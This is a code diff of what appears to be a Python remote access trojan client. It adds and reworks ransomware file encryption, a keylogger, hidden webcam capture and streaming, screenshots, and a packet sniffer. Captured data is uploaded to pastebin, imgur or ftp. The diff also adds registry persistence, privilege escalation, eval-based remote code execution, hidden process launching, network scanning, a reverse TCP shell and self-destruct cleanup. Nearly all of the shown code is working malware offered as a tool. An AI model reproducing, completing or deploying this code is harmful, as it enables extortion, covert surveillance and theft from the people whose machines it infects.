-        fpath  = os.path.join(os.path.expandvars('%TEMP%'), 'tmp{}.avi'.format(random.randint(1000,9999))) if os.name is 'nt' else os.path.join('/tmp', 'tmp{}.avi'.format(random.randint(1000,9999)))
-        fourcc = VideoWriter_fourcc(*'DIVX') if sys.platform is 'win32' else VideoWriter_fourcc(*'XVID')
-        output = VideoWriter(fpath, fourcc, 20.0, (640,480))
-        end = time.time() + duration
-        dev = VideoCapture(0)
-        while True:
-            ret, frame = dev.read()
-            output.write(frame)
-            if time.time() > end: break
-        dev.release()
-        result = self._upload_ftp(fpath)
+    def _webcam_video(self, *args, **kwargs):
         try:
-            os.remove(fpath)
-        except: pass
-        return result
-
-
-    @config(platforms=['win32','linux2','darwin'])
-    def _webcam_stream(self, port=None, retries=5):
-        if not port:
-            return self._get_usage(self.webcam_stream)
-        try:
-            host = self._session['socket'].getpeername()[0]
-        except socket.error:
-            self._session['connection'].clear()
-            return self.session()
-        port = int(port)
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        while retries > 0:
-            try:
-                sock.connect((host, port))
-            except socket.error:
-                retries -= 1
-            break
-        if not retries:
-            return 'Stream failed - connection error'
-        dev = VideoCapture(0)
-        try:
-            t1 = time.time()
+            fpath   = os.path.join(os.path.expandvars('%TEMP%'), 'tmp{}.avi'.format(random.randint(1000,9999))) if os.name is 'nt' else os.path.join('/tmp', 'tmp{}.avi'.format(random.randint(1000,9999)))
+            fourcc  = VideoWriter_fourcc(*'DIVX') if os.name is 'nt' else VideoWriter_fourcc(*'XVID')
+            output  = VideoWriter(fpath, fourcc, 20.0, (640,480))
+            length  = float(int([i for i in args if bytes(i).isdigit()][0])) if len([i for i in args if bytes(i).isdigit()]) else 5.0
+            end     = time.time() + length
+            dev     = VideoCapture(0)
             while True:
-                try:
-                    ret,frame=dev.read()
-                    data = pickle.dumps(frame)
-                    sock.sendall(struct.pack("L", len(data))+data)
-                    time.sleep(0.1)
-                except Exception as e:
-                    self._debug('Stream error: {}'.format(str(e)))
-                    break
-        finally:
+                ret, frame = dev.read()
+                output.write(frame)
+                if time.time() > end: break
+            dev.release()
+            result = self._upload_ftp(fpath)
             try:
-                dev.release()
-                sock.close()
+                os.remove(fpath)
             except: pass
+            return result
+        except Exception as e:
+            self._debug('{} error: {}'.format(self._webcam_video.func_name, str(e)))
 
 
+    def _webcam_stream(self, port=None, retries=5):
+        try:
+            if not port:
+                return self.webcam.usage
+            try:
+                host = self._session['socket'].getpeername()[0]
+            except socket.error:
+                self._session['connection'].clear()
+                return self.session()
+            port = int(port)
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            while retries > 0:
+                try:
+                    sock.connect((host, port))
+                except socket.error:
+                    retries -= 1
+                break
+            if not retries:
+                return 'Stream failed - connection error'
+            dev = VideoCapture(0)
+            try:
+                t1 = time.time()
+                while True:
+                    try:
+                        ret,frame=dev.read()
+                        data = pickle.dumps(frame)
+                        sock.sendall(struct.pack("L", len(data))+data)
+                        time.sleep(0.1)
+                    except Exception as e:
+                        self._debug('Stream error: {}'.format(str(e)))
+                        break
+            finally:
+                try:
+                    dev.release()
+                    sock.close()
+                except: pass
+        except Exception as e:
+            self._debug('{} error: {}'.format(self._webcam_stream.func_name, str(e)))
+            return '{} error: {}'.format(self._webcam_stream.func_name, str(e))
+
+
+    def _ransom_encrypt(self, args):
+        try:
+            dirname, fnames = args
+            targets = [os.path.join(dirname, f) for f in fnames if os.path.splitext(f)[1] in ['.pdf','.zip','.ppt','.doc','.docx','.rtf','.jpg','.jpeg','.png','.img','.gif','.mp4','.mpeg','.mov','.avi','.wmv','.rtf','.txt','.html','.php','.js','.css','.odt', '.ods', '.odp', '.odm', '.odc', '.odb', '.doc', '.docx', '.docm', '.wps', '.xls', '.xlsx', '.xlsm', '.xlsb', '.xlk', '.ppt', '.pptx', '.pptm', '.mdb', '.accdb', '.pst', '.dwg', '.dxf', '.dxg', '.wpd', '.rtf', '.wb2', '.mdf', '.dbf', '.psd', '.pdd', '.pdf', '.eps', '.ai', '.indd', '.cdr', '.jpg', '.jpe', '.jpg', '.dng', '.3fr', '.arw', '.srf', '.sr2', '.bay', '.crw', '.cr2', '.dcr', '.kdc', '.erf', '.mef', '.mrw', '.nef', '.nrw', '.orf', '.raf', '.raw', '.rwl', '.rw2', '.r3d', '.ptx', '.pef', '.srw', '.x3f', '.der', '.cer', '.crt', '.pem', '.pfx', '.p12', '.p7b', '.p7c']]
+            self._ransom.extend(map(self.encrypt, targets))
+        except Exception as e:
+            self._debug("{} returned error: {}".format(self._ransom_encrypt.func_name, str(e)))
+
+
+    def _ransom_decrypt(self):
+        try:
+            for x in map(self.decrypt, self._ransom):
+                _ = self._ransom.pop(x, None)
+        except Exception as e:
+            self._debug("{} returned error: {}".format(self._ransom_decrypt.func_name, str(e)))
+ 
+
+    @config(platforms=['win32'])
+    def _ransom_windows(self, path):
+        try:
+            if os.path.isdir(path):                                                                                                                                                              
+                walk = lambda _, d, f: self._queue.put_nowait((self._ransom_encrypt, (d, f)))
+                os.path.walk(path, walk, None)
+                for i in xrange(10):
+                    self._jobs["ransom-%d" % i] = threading.Thread(target=self._get_worker, name=time.time())
+                    self._jobs["ransom-%d" % i].daemon = True
+                    self._jobs["ransom-%d" % i].start()
+                for job in [_ for _ in self._jobs if "ransom" in _ if self._jobs[_].is_alive()]:
+                    self._jobs[job].join()
+                return json.dumps(self._ransom)
+        except Exception as e:
+            return "{} returned error: {}".format(self.ransom.func_name, str(e))
+
+ 
     @config(platforms=['win32','linux2','darwin'])
     def _persistence_add_hidden_file(self):
         if hasattr(self, '__f__'):
@@ -918,11 +924,8 @@ class Client():
             except:
                 value = self.__f__
             if os.path.isfile(value):
-                run_key = r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
-                reg_key = OpenKey(HKEY_CURRENT_USER, run_key, 0, KEY_WRITE)
                 try:
-                    SetValueEx(reg_key, name, 0, REG_SZ, value)
-                    CloseKey(reg_key)
+                    self._get_registry_key(name, value)
                     return (True, name)
                 except Exception as e:
                     self._debug('{} returned error: {}'.format(self._persistence_add_registry_key.func_name.strip('_'), str(e)))
@@ -941,8 +944,6 @@ class Client():
         return False
 
 
-
-    @config(platforms=['linux2','darwin'])
     def _packetsniffer_udp_header(self, data):
         try:
             udp_hdr = struct.unpack('!4H', data[:8])
@@ -963,7 +964,6 @@ class Client():
             self.packetsniffer.capture.append("Error in {} header: '{}'".format('UDP', str(e)))
 
 
-    @config(platforms=['linux2','darwin'])
     def _packetsniffer_tcp_header(self, recv_data):
         try:
             tcp_hdr = struct.unpack('!2H2I4H', recv_data[:20])
@@ -1002,7 +1002,6 @@ class Client():
             self.packetsniffer.capture.append("Error in {} header: '{}'".format('TCP', str(e)))
 
 
-    @config(platforms=['linux2','darwin'])
     def _packetsniffer_ip_header(self, data):
         try:
             ip_hdr = struct.unpack('!6H4s4s', data[:20]) 
@@ -1039,7 +1038,6 @@ class Client():
             self.packetsniffer.capture.append("Error in {} header: '{}'".format('IP', str(e)))
 
 
-    @config(platforms=['linux2','darwin'])
     def _packetsniffer_eth_header(self, data):
         try:
             ip_bool = False
@@ -1062,26 +1060,19 @@ class Client():
             self.packetsniffer.capture.append("Error in {} header: '{}'".format('ETH', str(e)))
 
 
-
-    # Public Methods
-
-
-
-    def run(self, *args, **kwargs):
-        self.session(*args, **kwargs)
-        self._jobs[self.reverse_tcp_shell.func_name] = threading.Thread(target=self.reverse_tcp_shell, name=time.time())
-        self._jobs[self.reverse_tcp_shell.func_name].start()
-
-
-    def send_data(self, **kwargs):
-        self._session['connection'].wait()
+    def _send(self, **kwargs):
         try:
-            self._session['socket'].sendall(self._encrypt(json.dumps(kwargs)) + '\n')
-        except socket.error:
-            self._session['connection'].clear()
+            self._session.get('connection').wait()
+            kwargs['data'] = kwargs.get('data') if len(str(kwargs.get('data'))) <= 4096 else kwargs.get('data')[:4096 - len('... (continued)')] + '... (continued)'
+            try:
+                self._session['socket'].sendall(self._encrypt(json.dumps(kwargs)) + '\n')
+            except socket.error:
+                self._session['connection'].clear()
+        except Exception as e:
+            self._debug('{} error: {}'.format(self._send.func_name, str(e)))
 
 
-    def recv_data(self, end="\n"):
+    def _recv(self, end="\n"):
         try:
             data = ""
             while end not in data:
@@ -1092,7 +1083,708 @@ class Client():
                 data = self._decrypt(data.rstrip())
             return json.loads(data)
         except Exception as e:
-            self._debug('{} error: {}'.format(self.recv_data.func_name, str(e)))
+            self._debug('{} error: {}'.format(self._recv.func_name, str(e)))
+
+
+    def _post(self, url, headers={}, data={}):
+        dat = urllib.urlencode(data)
+        req = urllib2.Request(url, data=dat) if data else urllib2.Request(url)
+        for key, value in headers.items():
+            req.headers[key] = value
+        return urllib2.urlopen(req).read()
+
+
+    def _ping(self, host):
+        try:
+            if subprocess.call("ping -{} 1 -w 90 {}".format('n' if os.name is 'nt' else 'c', host), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
+                self._network[host] = {}
+                return True
+            else:
+                return False
+        except Exception as e:
+            Client._debug("{} returned error: {}".format(self._ping.func_name, str(e)))
+            return False
+
+
+    def _port(self, addr):
+        try:
+            host = addr[0]
+            port = addr[1]
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(1.0)
+            sock.connect((host,int(port)))
+            data = sock.recv(1024)
+            if data:
+                data = ''.join([i for i in data if i in ([chr(n) for n in range(32, 123)])])
+                info = {port: {'protocol': self._services.get(str(port))[0] if str(port) in self._services else ('mysql' if int(port) == 3306 else 'N/A'), 'service': data.splitlines()[0] if '\n' in data else str(data if len(str(data)) <= 50 else data[:46] + ' ...'), 'state': 'open'}}
+            else:
+                info = {port: {'protocol': self._services.get(str(port))[0] if str(port) in self._services else ('mysql' if int(port) == 3306 else 'N/A'), 'service': self._services.get(str(port))[1] if str(port) in self._services else 'n/a', 'state': 'open'}}
+            self._network.get(host).update(info)
+        except (socket.error, socket.timeout):
+            pass
+        except Exception as e:
+            self._debug('{} error: {}'.format(self._port.func_name, str(e)))
+
+
+    def _event(self, event):
+        try:
+
+            if event.WindowName != vars(self.keylogger)['window']:
+                vars(self.keylogger)['window'] = event.WindowName
+                self.keylogger.buffer.write("\n[{}]\n".format(vars(self.keylogger)['window']))
+
+            if event.Ascii > 32 and event.Ascii < 127:
+                self.keylogger.buffer.write(chr(event.Ascii))
+            elif event.Ascii == 32:
+                self.keylogger.buffer.write(' ')
+            elif event.Ascii in (10,13):
+                self.keylogger.buffer.write('\n')
+            elif event.Ascii == 8:
+                self.keylogger.buffer.seek(-1, 1)
+                self.keylogger.buffer.truncate()
+            else:
+                pass
+        except Exception as e:
+            self._debug('{} returned error: {}'.format(self._event.func_name, str(e)))
+        return True
+
+
+    def _server(self):
+        if hasattr(self, '__a__') and hasattr(self, '__b__'):
+            try:
+                a = self._get_config(long(self.__a__))
+                b = self._get_config(long(self.__b__))
+                c = urllib2.Request(a)
+                c.headers = {'API-Key': b}
+                d = urllib2.urlopen(c).read()
+                e = json.loads(d)
+                f = e[e.keys()[0]][0].get('ip')
+                if self._get_ipv4_address(f):
+                    return f
+                else:
+                    self._debug("{} returned invalid IPv4 address: '{}'\ndefaulting to localhost".format(self._server.func_name, str(f)))
+                    return socket.gethostbyname(socket.gethostname())
+            except Exception as e2:
+                self._debug("{} returned error: {}".format(self._server.func_name, str(e2)))
+        return socket.gethostbyname(socket.gethostname())
+
+
+    def _standby(self):
+        try:
+            addr = None
+            try:
+                addr = self._session['socket'].getpeername()
+            except: pass
+            self.kill()
+            while True:
+                time.sleep(60)
+                if addr:
+                    self.session(host=addr[0], port=addr[1])
+                else:
+                    self.session()
+                if self._session['connection'].is_set():
+                    break
+            return self.reverse_tcp_shell()
+        except Exception as e:
+            self._debug('{} error: {}'.format(self._standby.func_name, str(e)))
+            return '{} error: {}'.format(self._standby.func_name, str(e))
+            
+        
+    def _keylogger(self, *args, **kwargs):
+        while True:
+            try:
+                hm = HookManager()
+                hm.KeyDown = self._event
+                hm.HookKeyboard()
+                if os.name is 'nt':
+                    PumpMessages()
+                else:
+                    time.sleep(0.1)
+            except Exception as e:
+                self._debug('{} error: {}'.format(self._keylogger.func_name, str(e)))
+                break
+
+
+    # Commands
+
+    
+    @staticmethod
+    @config(platforms=['win32','linux2','darwin'], command=True, usage='encrypt <file>')
+    def encrypt(filepath, *args):
+        """
+        encrypt the target file
+        """
+        try:
+            if os.path.isfile(filepath):
+                try:
+                    with open(filepath, 'rb') as fp:
+                        plaintext = fp.read()
+                    ciphertext = Client._encrypt(plaintext)
+                    if 'debug' in args:
+                        target = os.path.join(os.path.dirname(filepath), 'encrypted_%s' % os.path.basename(filepath))
+                        with open(target, 'wb') as fd:
+                            fd.write(ciphertext)
+                    else:
+                        with open(filepath, 'wb') as fd:
+                            fd.write(ciphertext)
+                    return filepath
+                except Exception as e:
+                    return "Error: {}".format(str(e))
+            else:
+                return "File '{}' not found".format(filepath)
+        except Exception as e2:
+            return "{} returned error: {}".format(Client.encrypt.func_name, str(e2))
+
+
+    @staticmethod
+    @config(platforms=['win32','linux2','darwin'], command=True, usage='decrypt <file>')
+    def decrypt(filepath):
+        """
+        decrypt the target file
+        """
+        try:
+            if os.path.isfile(filepath):
+                try:
+                    with open(filepath, 'rb') as fp:
+                        ciphertext = fp.read()
+                    plaintext = Client._decrypt(ciphertext)
+                    with open(filepath, 'wb') as fd:
+                        fd.write(plaintext)
+                    return filepath
+                except Exception as e:
+                    return str(e)
+            else:
+                return "File '{}' not found".format(filepath)
+        except Exception as e2:
+            Client._debug("{} returned error: {}".format(Client.decrypt.func_name, str(e2)))
+
+
+    @config(platforms=['win32'], wallet=None, command=True, usage='ransom [wallet]')
+    def ransom(self, path, *args, **kwargs):
+        """
+        encrypt all host files and ransom them back to the user
+        """
+        try:
+            self._ransom_windows(path)
+            return json.dumps(self._ransom)
+        except Exception as e:
+            return "{} returned error: '{}'".format(self.ransom.func_name, str(e))
+
+
+    @config(platforms=['win32','linux2','darwin'], command=True, usage='upload <mode> <file>')
+    def upload(self, args):
+        """
+        upload file/data to imgur, pastebin, or ftp
+        """
+        try:
+            mode, _, source = str(args).partition(' ')
+            target  = '_upload_{}'.format(mode)
+            if not source or not hasattr(self, target):
+                return self.upload.usage
+            try:
+                return getattr(self, target)(source)
+            except Exception as e:
+                return 'Upload error: {}'.format(str(e))
+        except Exception as e:
+            return "{} returned error: '{}'".format(self.upload.func_name, str(e))
+
+
+    @config(platforms=['win32','linux2','darwin'], command=True, usage='scan <mode> <host>')
+    def scan(self, *args):
+        """
+        scans host/network for online hosts and open ports
+        """
+        try:
+            host = [i for i in args if self._get_ipv4_address(i)][0] if len([i for i in args if self._get_ipv4_address(i)]) else self._info.get('local')
+            return self._scan_network(host) if 'network' in args else self._scan_host(host)
+        except Exception as e:
+            return "{} returned error: '{}'".format(self.scan.func_name, str(e))        
+
+
+    @config(platforms=['win32','linux2','darwin'], command=True, usage='webcam <mode> [options]')
+    def webcam(self, args=None):
+        """
+        capture from webcam and upload to imgur or ftp
+        """
+        if not args:
+            return self.webcam.usage
+        try:
+            args = str(args).split()
+            if 'stream' in args:
+                if len(args) != 2:
+                    return "Error - stream mode requires argument: 'port'"
+                elif not str(args[1]).isdigit():
+                    return "Error - port must be integer between 1 - 65355"
+                else:
+                    return self._webcam_stream(port=args[1])
+            else:
+                return self._webcam_image(*args) if 'video' not in args else self._webcam_video(*args)
+        except Exception as e:
+            return "{} returned error: '{}'".format(self.webcam.func_name, str(e))
+
+
+    @config(platforms=['linux2','darwin'], command=True, usage='packetsniffer [mode]')
+    def packetsniffer(self, *args):
+        """
+        capture packets and upload to pastebin or ftp
+        """
+        def sniffer(self, seconds, *args):
+            limit = time.time() + seconds
+            sniffer_socket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
+            while time.time() < limit:
+                try:
+                    recv_data = sniffer_socket.recv(2048)
+                    recv_data, ip_bool = self._packetsniffer_eth_header(recv_data)
+                    if ip_bool:
+                        recv_data, ip_proto = self._packetsniffer_ip_header(recv_data)
+                        if ip_proto == 6:
+                            recv_data = self._packetsniffer_tcp_header(recv_data)
+                        elif ip_proto == 17:
+                            recv_data = self._packetsniffer_udp_header(recv_data)
+                except: break
+            sniffer_socket.close()
+            try:
+                output = cStringIO.StringIO('\n'.join(self.packetsniffer.capture))
+                result = self._upload_pastebin(output) if 'ftp' not in args else self._upload_ftp(output)
+            except Exception as e:
+                self._debug("packetsniffer manager returned error: {}".format(str(e)))
+        try:
+            duration = 300.0 if not len([i for i in args if str(i).isdigit()]) else int([i for i in args if str(i).isdigit()][0])
+            if self.packetsniffer.func_name in self._jobs:
+                return "packetsniffer running for {}".format(self._get_status(self._jobs[self.packetsniffer.func_name].name))
+            if not str(duration).isdigit():
+                return "packetsniffer argument 'duration' must be integer"
+            duration = int(duration)
+            self._jobs[self.packetsniffer.func_name] = threading.Thread(target=sniffer, args=(self, duration), name=time.time())
+            self._jobs[self.packetsniffer.func_name].start()
+            return 'Capturing network traffic for {} seconds'.format(duration)
+        except Exception as e:
+            return "{} returned error: '{}'".format(self.packetsniffer.func_name, str(e))
+
+
+    @config(platforms=['win32','linux2','darwin'], command=True, usage='cd <path>')
+    def cd(self, path='.'):
+        """
+        change current working directory
+        """
+        try:
+            if os.path.isdir(path):
+                os.chdir(path)
+            else:
+                os.chdir('.')
+        except Exception as e:
+            return "{} returned error: '{}'".format(self.cd.func_name, str(e))            
+
+
+    @config(platforms=['win32','linux2','darwin'], command=True, usage='ls <path>')
+    def ls(self, path='.'):
+        """
+        list directory contents
+        """
+        try:
+            return '\n'.join(os.listdir(path)) if os.path.isdir(path) else 'Error: path not found'
+        except Exception as e2:
+            return "{} returned error: {}".format(self.ls.func_name, str(e2))
+
+        
+    @config(platforms=['win32','linux2','darwin'], command=True, usage='ps [args]')
+    def ps(self, args=None):
+        """
+        list, search, kill processes
+        """
+        try:
+            output = {}
+            process_list = psutil.process_iter()
+            if not args:
+                for p in process_list:
+                    try:
+                        if len(json.dumps(output)) < 2048:
+                            output.update({str(p.pid).encode(): "{:>20} | {:>10}".format(str(p.name())[:19], str(p.status())).encode()})
+                        else:
+                            break
+                    except Exception as e:
+                        Client._debug(str(e))
+                        break
+            else:
+                cmd, _, arg  = str(args).partition(' ')
+                if 'search' in cmd:
+                    for p in process_list:
+                        if arg in str(p.name()):
+                            try:
+                                if len(json.dumps(output)) < 2048:
+                                    output.update({str(p.pid).encode(): "{:>20} | {:>10}".format(str(p.name())[:19], str(p.status())).encode()})
+                                else:
+                                    break
+                            except Exception as e:
+                                Client._debug(str(e))
+                                break
+                elif 'kill' in cmd or 'terminate' in cmd:
+                    if str(arg).isdigit():
+                        try:
+                            pr = psutil.Process(pid=int(arg))
+                            pr.kill()
+                            output.update({str(arg): "killed"})
+                        except:
+                            output.update({str(arg): "not found"})
+                    else:
+                        for p in process_list:
+                            try:
+                                if str(cmd) in str(p.name()):
+                                    p.kill()
+                                    output.update({str(p.name()): "killed"})
+                            except Exception as e:
+                                Client._debug(str(e))
+            return json.dumps(output)
+        except Exception as e:
+            return "{} returned error: '{}'".format(self.ps.func_name, str(e))
+
+        
+    @config(platforms=['win32','linux2','darwin'], command=True, usage='pwd')
+    def pwd(self):
+        """
+        show name of present working directory
+        """
+        try:
+            return '\nPresent working directory:\n\n{}\n'.format(os.getcwd())
+        except Exception as e:
+            return "{} returned error: '{}'".format(self.pwd.func_name, str(e))
+
+
+    @config(platforms=['win32','linux2','darwin'], command=True, usage='cat <path>')
+    def cat(self, path):
+        """
+        display file contents
+        """
+        try:
+            output = ""
+            if not os.path.isfile(path):
+                return "Error: file not found"
+            target = open(path, 'r')
+            while True:
+                try:
+                    line = target.readline().rstrip()
+                    if not bytes(line).isspace() and len(bytes(line)) and len(output + '\n' + bytes(line)) < 4096:
+                        output += '\n' + line
+                    else: break
+                except: break
+            return output
+        except Exception as e:
+            return "{} returned error: '{}'".format(self.cat.func_name, str(e))        
+
+
+    @config(platforms=['win32','linux2','darwin'], command=True, usage='set <cmd> [key=value]')
+    def set(self, arg):
+        """
+        set client options
+        """
+        try:
+            target, _, opt = arg.partition(' ')
+            option, _, val = opt.partition('=')
+            if val.isdigit() and int(val) in (0,1):
+                val = bool(int(val))
+            elif val.isdigit():
+                val = int(val)
+            elif val.lower() in ('true', 'on', 'enable'):
+                val = True
+            elif val.lower() in ('false', 'off', 'disable'):
+                val = False
+            elif ',' in val:
+                val = val.split(',')
+            try:
+                setattr(getattr(self, target), option, val)
+            except:
+                getattr(self, target).func_dict[option] = val
+            return json.dumps(vars(getattr(self, target)))
+        except Exception as e:
+            return "{} returned error: '{}'".format(self.set.func_name, str(e))
+
+
+    @config(platforms=['win32','linux2','darwin'], command=True, usage='wget <url>')
+    def wget(self, url, filename=None):
+        """
+        download file from url
+        """
+        if url.startswith('http'):
+            try:
+                path, _ = urllib.urlretrieve(url, filename)
+                return path
+            except Exception as e:
+                return "'{}' returned error: '{}'".format(self.wget.func_name, str(e))
+        else:
+            return 'Invalid target URL - must begin with http:// or https://'
+
+
+    @config(platforms=['win32','linux2','darwin'], command=True, usage='kill')
+    def kill(self):
+        """
+        shutdown the current connection
+        """
+        try:
+            self._session.get('socket').close()
+            _ = self._session.pop('socket', None)
+            del _
+        except: pass
+
+        try:
+            self._session['socket'] = None
+            self._session['key']    = None
+            self._session['id']     = None
+        except Exception as e1:
+            self._debug("{} returned error: {}".format(self.kill.func_name, str(e1)))
+
+        try:
+            self._session['connection'].clear()
+        except Exception as e2:
+            self._debug("{} returned error: {}".format(self.kill.func_name, str(e2)))
+
+        for t in [i for i in self._jobs]:
+            try:
+                _ = self._jobs.pop(t, None)
+                del _
+            except: pass
+
+
+    @config(platforms=['win32','linux2','darwin'], command=True, usage='show <value>')
+    def show(self, *args):
+        """
+        show client help, information, jobs, network, privileges, or results
+        """
+        try:
+            if 'info' in args:
+                return json.dumps(self._info)
+            elif 'network' in args:
+                return json.dumps(self._network)
+            elif 'results' in args:
+                return json.dumps(self._results)
+            elif 'help' in args:
+                return json.dumps({self._commands[cmd]["usage"].encode(): self._commands[cmd]["description"].encode() for cmd in self._commands})
+            elif 'jobs' in args:
+                return json.dumps({a: self._get_status(self._jobs[a].name) for a in self._jobs if self._jobs[a].is_alive()})
+            elif 'privileges' in args:
+                return json.dumps({'username': self._info.get('username'),  'administrator': 'true' if bool(os.getuid() == 0 if os.name is 'posix' else ctypes.windll.shell32.IsUserAnAdmin()) else 'false'})
+            else:
+                return self.show.usage
+        except Exception as e:
+            return "'{}' returned error: '{}'".format(self.jobs.func_name, str(e))
+
+
+    @config(platforms=['win32','linux2','darwin'], command=True, usage='stop <job>')
+    def stop(self, target):
+        """
+        stop a job in progress
+        """
+        try:
+            if target in self._jobs:
+                _ = self._jobs.pop(target, None)
+                return "Job '{}' was stopped.".format(target)
+            else:
+                return "Job '{}' not found".format(target)
+        except Exception as e:
+            return "{} returned error: '{}'".format(self.stop.func_name, str(e))
+
+
+    @config(platforms=['win32','linux2','darwin'], command=True, usage='unzip <file>')
+    def unzip(self, path):
+        """
+        unzip a compressed archive/file
+        """
+        if os.path.isfile(path):
+            try:
+                return zipfile.ZipFile(path).extractall('.')
+            except Exception as e:
+                return "{} returned error: '{}'".format(self.unzip.func_name, str(e))
+        else:
+            return "File '{}' not found".format(path)
+
+
+    @config(platforms=['win32','linux2','darwin'], command=True, usage='standby')
+    def standby(self):
+        """
+        disconnect from server but keep client alive
+        """
+        try:
+            self._jobs[self.standby.func_name] = threading.Timer(1.0, self._standby, args=(self,))            
+            self._jobs[self.standby.func_name].start()
+            return "{} standing by".format(self._info.get('ip'))
+        except Exception as e:
+            return "{} returned error: '{}'".format(self.standby.func_name, str(e))
+
+
+    @config(platforms=['win32'], command=True, usage='escalate')
+    def escalate(self):
+        """
+        attempt to escalate privileges
+        """
+        try:
+            if self._info.get('administrator'):
+                return "Current user '{}' has administrator privileges".format(self._info.get('username'))
+            if hasattr(self, '__f__') and os.path.isfile(long_to_bytes(long(self.__f__))):
+                if os.name is 'nt':
+                    ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(long_to_bytes(long(self.__f__))))
+                    sys.exit()
+                else:
+                    return "Privilege escalation not yet available on '{}'".format(sys.platform)
+        except Exception as e:
+            return "{} returned error: '{}'".format(self.escalate.func_name, str(e))
+
+
+    @config(platforms=['win32','linux2','darwin'], command=True, usage='evaluate <code>')
+    def evaluate(self, code):
+        """
+        eval() code directly and return output
+        """
+        try:
+            return eval(code)
+        except Exception as e:
+            return "eval('{}') failed with error: {}".format(str(code), str(e))
+
+
+    @config(platforms=['win32','linux2','darwin'], command=True, usage='execute <path>')
+    def execute(self, path):
+        """
+        execute a program in a hidden process
+        """
+        if os.path.isfile(path):
+            name = os.path.splitext(os.path.basename(path))[0]
+            try:
+                self._jobs[name] = self.hidden_process(path)
+                return "Job launched '{}' in a hidden process".format(name)
+            except Exception as e:
+                try:
+                    self._jobs[name] = subprocess.Popen(path, 0, None, None, subprocess.PIPE, subprocess.PIPE)
+                    return "Job launched '{}' in a standard subprocess (visible on host machine)".format(name)
+                except Exception as e:
+                    return "{} returned error: {}".format(self.execute.func_name, str(e))
+        else:
+            return "File '{}' not found".format(str(path))
+
+
+    @config(platforms=['win32','linux2','darwin'], max_bytes=4000, buffer=cStringIO.StringIO(), window=None, command=True, usage='keylogger [mode]')
+    def keylogger(self, *args, **kwargs):
+        """
+        run keylogger and upload logs to pastebin or ftp
+        """
+        def manager(self):
+            try:
+                while True:
+                    if self.keylogger.buffer.tell() > self.keylogger.max_bytes:
+                        result  = self._upload_ftp(self.keylogger.buffer) if 'ftp' in args else self._upload_pastebin(self.keylogger.buffer)
+                        task    = self._get_task(self.keylogger.func_name, result)
+                        self.keylogger.buffer.reset()
+                    else:
+                        time.sleep(5)
+            except Exception as e:
+                self._debug("{} returned error: {}".format(manager.func_name, str(e)))
+
+        if self.keylogger.func_name not in self._jobs:
+            self._jobs[self.keylogger.func_name] = threading.Thread(target=self._keylogger, name=time.time())
+            self._jobs[self.keylogger.func_name].setDaemon(True)
+            self._jobs[self.keylogger.func_name].start()
+            self._jobs[manager.func_name] = threading.Thread(target=manager, args=(self,), name=time.time())
+            self._jobs[manager.func_name].setDaemon(True)
+            self._jobs[manager.func_name].start()
+        return self._get_status(self._jobs[self.keylogger.func_name].name)
+    
+
+    @config(platforms=['win32','linux2','darwin'], command=True, usage='screenshot [mode]')
+    def screenshot(self, *args):
+        """
+        capture screenshot and upload to imgur or ftp
+        """
+        try:
+            with mss.mss() as screen:
+                img = screen.grab(screen.monitors[0])
+            png     = self._get_png(img)
+            result  = self._upload_imgur(png) if 'ftp' not in args else self._upload_ftp(png)
+            return result
+        except Exception as e:
+            return "{} returned error: '{}'".format(self.screenshot.func_name, str(e))
+
+
+    @config(platforms=['win32','linux2','darwin'], methods={method: {'established': bool(), 'result': bytes()} for method in ['hidden_file','scheduled_task','registry_key','startup_file','launch_agent','crontab_job']}, command=True, usage='persistence <args>')
+    def persistence(self, args=None):
+        """
+        establish persistent access to the client host machine
+        """
+        try:
+            if not args:
+                for method in [_ for _ in self.persistence.methods if not self.persistence.methods[_]['established']]:
+                    target = '_persistence_add_{}'.format(method)
+                    if sys.platform in getattr(self, target).platforms:
+                        established, result = getattr(self, target)()
+                        self.persistence.methods[method]['established'] = established
+                        self.persistence.methods[method]['result'] = result
+                    else:
+                        self.persistence.methods[method]['established'] = False
+                        self.persistence.methods[method]['result'] = "Persistence method '{}' is not compatible with {}".format(method, sys.platform)
+                return json.dumps(self.persistence.methods, indent=2)
+            else:
+                cmd, _, method = str(args).partition(' ')
+                method = method.replace(' ','_') if ' ' in method else method
+                if 'method' in cmd:
+                    return json.dumps(self.persistence.methods)
+                elif not method or cmd not in ('add','remove') or method not in self.persistence.methods:
+                    return self.persistence.usage
+                elif self.persistence.methods[method].get('established'):
+                    return json.dumps(self.persistence.methods[method])
+                else:
+                    target = '_persistence_{}_{}'.format(cmd, method)
+                    if sys.platform in getattr(self, target).platforms:
+                        established, result = getattr(self, target)()
+                        self.persistence.methods[method]['established'] = established
+                        self.persistence.methods[method]['result'] = result
+                    else:
+                        self.persistence.methods[method]['established'] = False
+                        self.persistence.methods[method]['result'] = "Persistence method '{}' is not compatible with {}".format(method, sys.platform)
+                    return json.dumps(self.persistence.methods[method])
+        except Exception as e:
+            return "{} returned error: '{}'".format(self.persistence.func_name, str(e))
+
+                
+    @config(platforms=['win32','linux2','darwin'], command=True, usage='selfdestruct')
+    def selfdestruct(self):
+        """
+        self-destruct and leave no trace on disk
+        """
+        try:
+            self.abort = True
+            self.kill()
+            
+            if hasattr(self, '__f__') and os.path.isfile(self._get_config(long(self.__f__))).read():
+                try:
+                    os.remove(self.__f__)
+                except: pass
+                
+                for method in [_ for _ in self.persistence.methods if self.persistence.methods[_]]:
+                    try:
+                        remove = getattr(self, '_persistence_remove_{}'.format(method))()
+                    except Exception as e2:
+                        self._debug("Error removing persistence method '{}': {}".format(method, str(e2)))
+            
+            try:
+                os.remove(__file__)
+            except: pass
+
+        finally:
+            shutdown = threading.Timer(1, self._shutdown)
+            shutdown.start()
+            sys.exit(0)
+            
+
+    @config(platforms=['win32','linux2','darwin'], command=True, usage='hide <path>')
+    def hide(self, path, shell=True):
+        """
+        execute a program in a hidden process 
+        """
+        try:
+            info = subprocess.STARTUPINFO()
+            info.dwFlags = subprocess.STARTF_USESHOWWINDOW | subprocess.CREATE_NEW_PROCESS_GROUP
+            info.wShowWindow = subprocess.SW_HIDE
+            p = subprocess.Popen(path, startupinfo=info)
+            return p
+        except Exception as e:
